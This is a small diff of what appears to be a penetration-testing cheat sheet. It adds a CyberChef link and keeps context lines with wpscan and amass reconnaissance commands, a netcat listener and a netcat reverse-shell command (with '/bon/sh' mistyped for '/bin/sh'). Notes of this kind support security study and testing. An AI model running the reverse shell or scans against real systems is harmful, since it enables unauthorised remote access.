@@ -31,5 +31,8 @@ wpscan --url http://website --enumerate  vp,vt --plugins-detection aggressive (n
 
 amass enum -d domain --passive - gives XXXX  
 
+## Online Tools ##
+https://gchq.github.io/CyberChef/  -  
+
 nc -lvp 1337  
 nc -e /bon/sh ip 1337   
